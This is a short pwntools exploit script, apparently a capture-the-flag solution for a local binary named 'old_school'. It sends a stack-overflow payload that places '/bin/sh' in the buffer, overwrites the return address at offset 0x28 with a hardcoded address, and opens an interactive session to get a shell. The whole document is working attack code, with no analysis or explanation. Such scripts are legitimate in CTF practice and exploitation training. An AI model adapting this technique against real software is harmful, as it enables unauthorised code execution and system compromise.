#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./old_school")

io = elf.process()

payload = flat({
    0: b"/bin/sh\x00",
    8: p64(0),
    16: p64(0),
    0x28: p64(0x0000000000401012),
    57: b"A"
})

io.sendlineafter(b"? ", payload)
io.interactive()
